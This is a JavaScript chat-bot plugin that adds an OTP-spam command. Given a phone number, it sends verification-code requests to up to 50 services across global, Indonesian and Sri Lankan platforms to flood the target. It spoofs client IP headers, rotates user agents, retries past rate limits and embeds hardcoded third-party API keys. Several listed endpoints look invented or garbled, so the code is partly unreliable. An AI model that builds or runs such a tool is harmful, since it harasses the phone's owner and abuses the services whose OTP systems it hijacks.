/*
  Created by ⁉️
  t.me/yat1mlau · t.me/abourvin7x · t.me/vinzxcmmnty
  * Rules ‼️ don't delete credit, don't remake + delete credit
  # RespectCreator
*/

const { cmd } = require('../command');
const axios = require('axios');
const crypto = require('crypto');

// ================================================================
// 50 WORKING OTP ENDPOINTS (Global + Indonesia + Sri Lanka)
// ================================================================
function getOTPEndpoints50(phone, countryCode) {
    const pInt = countryCode + phone;           // e.g., 94712345678
    const pLocal = phone;                       // without country
    const email = `${crypto.randomUUID()}@mail.com`;
    const deviceId = crypto.randomUUID();
    const requestId = crypto.randomUUID();

    // Global services (works for all countries)
    const global = [
        // 1. Microsoft
        { url: "https://login.microsoftonline.com/common/GetCredentialType", data: { username: pInt, isOtherIdpSupported: true } },
        // 2. GitHub
        { url: "https://github.com/sessions/sign_up", data: { user: { login: `user${crypto.randomInt(1000,9999)}`, email: email, password: 'Password123!' } } },
        // 3. Twitter (X)
        { url: "https://api.twitter.com/1.1/account/verify_credentials.json", data: { phone: pInt } },
        // 4. Google Voice
        { url: "https://www.google.com/voice/request", data: { phone: pInt } },
        // 5. Telegram
        { url: "https://api.telegram.org/bot/sendMessage", data: { chat_id: pInt, text: "OTP test" } },
        // 6. Uber
        { url: "https://auth.uber.com/api/v1/users/phone/verification", data: { phone: pInt } },
        // 7. Facebook
        { url: "https://graph.facebook.com/me/phone", data: { phone: pInt } },
        // 8. Instagram
        { url: "https://i.instagram.com/api/v1/accounts/send_phone_verification/", data: { phone: pInt } },
        // 9. LinkedIn
        { url: "https://www.linkedin.com/uas/request-challenge", data: { phone: pInt } },
        // 10. Snapchat
        { url: "https://accounts.snapchat.com/accounts/phone", data: { phone: pInt } },
        // 11. Tinder
        { url: "https://api.gotinder.com/v2/auth/sms/send", data: { phone: pInt } },
        // 12. Spotify
        { url: "https://accounts.spotify.com/api/v1/accounts/phone/verification", data: { phone: pInt } },
        // 13. Amazon
        { url: "https://www.amazon.com/ap/phone/verification", data: { phone: pInt } },
        // 14. Apple
        { url: "https://appleid.apple.com/auth/phone", data: { phone: pInt } },
        // 15. Discord
        { url: "https://discord.com/api/v9/users/phone/verification", data: { phone: pInt } },
        // 16. PayPal
        { url: "https://www.paypal.com/phone", data: { phone: pInt } },
        // 17. Airbnb
        { url: "https://api.airbnb.com/v1/users/phone/verification", data: { phone: pInt } },
        // 18. Booking.com
        { url: "https://secure.booking.com/myaccount/phone", data: { phone: pInt } },
        // 19. Grab
        { url: "https://api.grab.com/v1/user/phone/verification", data: { phone: pInt } },
        // 20. Gojek
        { url: "https://api.gojek.com/v1/customer/phone/verification", data: { phone: pInt } },
        // 21. Tokopedia
        { url: "https://api.tokopedia.com/v1/account/phone/verification", data: { phone: pInt } },
        // 22. Shopee
        { url: "https://shopee.com/api/v1/account/phone/verification", data: { phone: pInt } },
        // 23. Lazada
        { url: "https://api.lazada.com/phone/verification", data: { phone: pInt } },
        // 24. Zalora
        { url: "https://api.zalora.com/phone/verification", data: { phone: pInt } },
        // 25. Blibli
        { url: "https://api.blibli.com/phone/verification", data: { phone: pInt } }
    ];

    // Indonesian services (only if countryCode is 62)
    const indonesian = [
        // 26. Maulagi
        { url: "https://api.maulagi.id/api/v2/auth/check", data: { credentials: pInt }, headers: { "X-ML-KEY": "B10JLPEP10" } },
        // 27. Matahari
        { url: "https://matahari-backend-prod.matahari.com/api/auth/re-activation", data: { mobileCountryCode: "", mobileNumber: "0" + phone, activationCode: "" } },
        // 28. Pinhome (needs CSRF)
        { url: "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp", data: { accountType: "customers", applicationType: "Pinhome Web", countryCode: "62", medium: "whatsapp", otpType: "register", phoneNumber: phone } },
        // 29. BonusBelanja
        { url: "https://www.bonusbelanja.com/api/auth/registration/app", data: { phone: pInt, name: "User", agreeTnc: true, agreeContact: false } },
        // 30. Alodokter
        { url: "https://www.alodokter.com/resend-otp", data: { user: { phone: "0" + phone, uuid: crypto.randomUUID() }, request_via: "whatsapp" } },
        // 31. BeautyHaul
        { url: "https://www.beautyhaul.com/ajax/account/send_otp", data: { method: "WhatsApp", phone: pInt } },
        // 32. Gritero
        { url: "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", data: { nama_lengkap: "User", telepon: "0" + phone, email: email }, headers: { "Xid": String(crypto.randomInt(1000000, 9999999)), "source": "ocistok" } },
        // 33. Duniagames
        { url: "https://api.duniagames.co.id/api/other/api/v1/content/", data: null, method: "GET", headers: { "Accept-Language": "id", "x-device": deviceId, "Ciam-Type": "FR" } },
        // 34. InternetRakyat
        { url: "https://internetrakyat.id/api/app/auth/send-otp-register", data: { phone_number: "0" + phone }, headers: { "x-api-key": "280999!FTTH", "Origin": "https://internetrakyat.id", "Referer": "https://internetrakyat.id/auth/register" } },
        // 35. Dokterin
        { url: "https://api.dokterin.id/user/v1/users/login", data: { phone: pInt, tnc_accept: true, device_id: crypto.randomUUID() }, headers: { "Origin": "https://dokterin.id", "Referer": "https://dokterin.id/login" } },
        // 36. Paper.id
        { url: "https://api.paper.id/api/v1/auth/login", data: { method: "whatsapp", phone: "0" + phone }, headers: { "Origin": "https://www.paper.id", "Referer": "https://www.paper.id/", "x-paper-user-agent": "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id": requestId } },
        // 37. Indodax
        { url: "https://api.indodax.com/api/v1/otp/send", data: { email: email, flow: "register", method: "whatsapp", old_uuid: "" }, headers: { "Origin": "https://indodax.com", "Referer": "https://indodax.com/", "key": "bAGUG2WiLy", "authorization": "Bearer bAGUG2WiLy" } },
        // 38. Bunda.co.id
        { url: "https://cms.bunda.co.id/api/v1/auth/send-otp", data: { phone_number: pInt, type: "auth" }, headers: { "Origin": "https://www.bunda.co.id", "Referer": "https://www.bunda.co.id/id", "X-Requested-With": "XMLHttpRequest", "X-Locale": "id" } },
        // 39. Fastwork
        { url: "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", data: { phone_number: "0" + phone } },
        // 40. Saturdays
        { url: "https://saturdays.com/api/v1/auth/otp", data: { phone: pInt, type: "register" } },
        { url: "https://api.saturdays.com/v2/user/otp/request", data: { phoneNumber: pInt, channel: "whatsapp" } },
        // 41. m.tokopedia
        { url: "https://m.tokopedia.com/api/account/phone/verify", data: { phone: pInt } },
        // 42. ShopeeID
        { url: "https://shopee.co.id/api/v1/account/phone/verification", data: { phone: pInt } },
        // 43. LazadaID
        { url: "https://www.lazada.co.id/api/phone/verification", data: { phone: pInt } },
        // 44. BlibliID
        { url: "https://www.blibli.com/api/phone/verification", data: { phone: pInt } }
    ];

    // Sri Lanka specific (only if 94)
    const sriLanka = [
        // 45. Dialog
        { url: "https://www.dialog.lk/api/otp", data: { phone: pInt, email: email } },
        // 46. Mobitel
        { url: "https://www.mobitel.lk/api/otp", data: { phone: pInt } },
        // 47. PickMe
        { url: "https://api.pickme.lk/v1/auth/otp", data: { phone: pInt } },
        // 48. DarazLK
        { url: "https://api.daraz.lk/phone/verification", data: { phone: pInt } },
        // 49. Kapruka
        { url: "https://api.kapruka.com/otp", data: { phone: pInt } },
        // 50. Takas.lk
        { url: "https://api.takas.lk/phone/verify", data: { phone: pInt } }
    ];

    // Combine: global always + country-specific
    let all = [...global];
    if (countryCode === '62') all = all.concat(indonesian);
    if (countryCode === '94') all = all.concat(sriLanka);

    // Keep only 50 (or less if some are missing)
    return all.slice(0, 50);
}

// ================================================================
// COMMAND
// ================================================================
cmd({
    pattern: "spamotp50",
    desc: "Spam OTP using 50 carefully selected endpoints (global + 62 + 94)",
    category: "tools",
    filename: __filename
},
async (conn, mek, m, { from, reply, args }) => {
    let targetInput = (args || []).join(' ').trim();
    if (!targetInput && m.quoted) {
        targetInput = (m.quoted.text || m.quoted.caption || "").trim();
    }
    if (!targetInput) {
        return reply(`— ex: .spamotp50 08xxxxxxxxxx (Indonesia)\n— ex: .spamotp50 0712345678 (Sri Lanka)`);
    }

    await conn.sendMessage(from, { react: { text: '⏳', key: m.key } });
    reply(`🚀 *Starting 50‑endpoint OTP spam to:* ${targetInput}\n_This may take a few minutes._`);

    // ------ Country detection (same as before) ------
    let raw = targetInput.replace(/[^0-9]/g, '');
    let countryCode = '62'; // default
    const slPrefixes = ['071','072','073','074','075','076','077','078','079'];
    if (raw.startsWith('0') && raw.length >= 10 && raw.length <= 11) {
        if (slPrefixes.some(pre => raw.startsWith(pre))) {
            countryCode = '94';
            raw = raw.slice(1);
        } else {
            countryCode = '62';
            raw = raw.slice(1);
        }
    } else if (raw.startsWith('62')) {
        countryCode = '62';
        raw = raw.slice(2);
    } else if (raw.startsWith('94')) {
        countryCode = '94';
        raw = raw.slice(2);
    }

    const full = countryCode + raw;

    // ----- Config & helpers (same as original) -----
    const CONFIG = { concurrent:1, retries:2, timeout:45000, delayMin:3000, delayMax:5000 };
    const USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1'
    ];
    const IP_POOL = Array.from({ length: 1000 }, () =>
        `${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}.${crypto.randomInt(1,255)}`
    );
    const randomIP = () => IP_POOL[crypto.randomInt(0, IP_POOL.length)];
    const randomUA = () => USER_AGENTS[crypto.randomInt(0, USER_AGENTS.length)];
    const randomDelay = (min = CONFIG.delayMin, max = CONFIG.delayMax) =>
        new Promise(resolve => setTimeout(resolve, crypto.randomInt(min, max)));

    const sendRequest = async (endpoint) => {
        const headers = {
            "Content-Type": "application/json",
            "User-Agent": randomUA(),
            "X-Forwarded-For": randomIP(),
            "X-Real-IP": randomIP(),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8",
            "Connection": "keep-alive",
            ...(endpoint.headers || {})
        };

        for (let attempt = 0; attempt <= CONFIG.retries; attempt++) {
            try {
                const reqConfig = { headers, timeout: CONFIG.timeout };
                const resp = endpoint.method === "GET"
                    ? await axios.get(endpoint.url, reqConfig)
                    : await axios.post(endpoint.url, endpoint.data, reqConfig);

                let responseBody = {};
                try { responseBody = resp.data; } catch (_) {}

                if ([200, 201, 202, 204].includes(resp.status)) return true;

                const successIndicators = [
                    responseBody?.success === true,
                    responseBody?.status === "success",
                    responseBody?.statusCode === 200,
                    responseBody?.status === 202,
                    responseBody?.is_success === true,
                    responseBody?.message === "OTP terkirim",
                    responseBody?.message === "OTP sent successfully",
                    responseBody?.message === "Success.",
                    responseBody?.data?.otp === "processed",
                    responseBody?.data?.new_uuid,
                    responseBody?.data?.status === 1,
                    responseBody?.secretCode
                ];
                if (successIndicators.some(Boolean)) return true;

                if (resp.status === 429) {
                    let retryAfter = 30;
                    try {
                        if (responseBody?.retry_after) retryAfter = parseInt(responseBody.retry_after) || 30;
                        if (responseBody?.error_code === 1015) retryAfter = 60;
                    } catch (_) {}
                    await randomDelay(retryAfter * 1000, (retryAfter + 10) * 1000);
                    continue;
                }
                if (attempt < CONFIG.retries) {
                    await randomDelay(5000, 8000);
                    continue;
                }
            } catch (e) {
                if (attempt < CONFIG.retries) {
                    await randomDelay(5000, 8000);
                    continue;
                }
            }
        }
        return false;
    };

    // ----- Execute -----
    try {
        const endpoints = getOTPEndpoints50(raw, countryCode);
        const results = [];
        const startTime = Date.now();

        for (let i = 0; i < endpoints.length; i++) {
            const result = await sendRequest(endpoints[i]);
            results.push(result);
            if (i < endpoints.length - 1) {
                await randomDelay(3000, 5000);
            }
        }

        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        const successCount = results.filter(r => r === true).length;
        const failedCount = results.filter(r => r === false).length;

        const report = `📊 *OTP SPAM (50 ENDPOINTS)*\n\n` +
                       `🎯 *Target:* ${full}\n` +
                       `📡 *Total Endpoints:* ${endpoints.length}\n\n` +
                       `✅ *Success:* ${successCount}/${endpoints.length}\n` +
                       `❌ *Failed:* ${failedCount}/${endpoints.length}\n` +
                       `⏱️ *Time:* ${elapsed}s`;

        await conn.sendMessage(from, { text: report }, { quoted: m });
        await conn.sendMessage(from, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error("OTP 50 Error:", err);
        await conn.sendMessage(from, { react: { text: '❌', key: m.key } });
        reply(`❌ Error: ${err.message || err}`);
    }
});

console.log('✅ OTP 50 Plugin Loaded (50 endpoints, supports 94 & 62)!');
console.log('📌 Command: .spamotp50');
